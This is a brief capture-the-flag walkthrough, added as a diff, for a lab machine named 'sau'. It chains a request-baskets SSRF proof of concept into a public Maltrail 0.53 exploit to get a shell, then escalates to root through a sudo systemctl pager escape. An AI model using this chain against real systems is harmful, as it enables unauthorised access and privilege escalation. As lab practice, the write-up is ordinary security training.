@@ -1,0 +1,34 @@
+sau
+
+	running nmap scan shows filtered port 80 and open 55555
+
+	going to 55555 shows that it's using request-baskets | Version: 1.2.1 
+
+	going to github issues we find this
+		https://github.com/entr0pie/CVE-2023-27163
+
+	running the poc - ./exploit121.sh http://10.10.11.224:55555 http://localhost:80
+		gives access to a mailtrail (0.53) server on port 80
+
+	googling mailtrail vulnerability gives this
+		https://github.com/spookier/Maltrail-v0.53-Exploit
+
+	running it gives shell as user puma
+	ls /home
+	cat /home/puma/user.txt gives user flag
+
+	running linpeas reveals this
+		User puma may run the following commands on sau:
+	    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+
+	sudo /usr/bin/systemctl status trail.service
+		!cat /root/root.txt
+
+	gives root flag
+
+	gg
+
+
+	
+
+	
